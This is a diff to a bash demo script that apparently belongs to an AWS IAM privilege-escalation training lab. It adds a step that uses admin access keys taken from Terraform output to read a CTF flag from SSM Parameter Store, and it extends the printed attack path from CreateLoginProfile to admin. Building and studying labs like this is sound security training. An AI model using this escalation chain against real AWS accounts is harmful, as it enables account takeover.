@@ -215,18 +215,42 @@ echo -e "${YELLOW}Step 7: Login profile has been successfully created${NC}"
 echo "The admin user can now log in with the new password."
 echo -e "${GREEN}✓ Confirmed login profile creation!${NC}\n"
 
-# Summary
+# [EXPLOIT] Step 8: Capture the CTF flag using the admin user's credentials
+echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
+echo "The admin user's access keys (issued by Terraform) grant AdministratorAccess."
+echo "Using those credentials to read the scenario flag..."
+export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.admin_access_key_id // empty' 2>/dev/null)
+export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.admin_secret_access_key // empty' 2>/dev/null)
+unset AWS_SESSION_TOKEN
+export AWS_REGION=$AWS_REGION
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-004-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
 echo -e "Step 2: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $ADMIN_USER_NAME"
 echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (console login)"
-echo -e "Result: ${GREEN}Administrator Access${NC}"
+echo -e "Step 4: Captured CTF flag from SSM Parameter Store: ${GREEN}$FLAG_VALUE${NC}"
+echo -e "Result: ${GREEN}Administrator Access + CTF Flag${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreateLoginProfile) → $ADMIN_USER_NAME → Admin"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreateLoginProfile) → $ADMIN_USER_NAME → Admin → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -244,9 +268,6 @@ echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
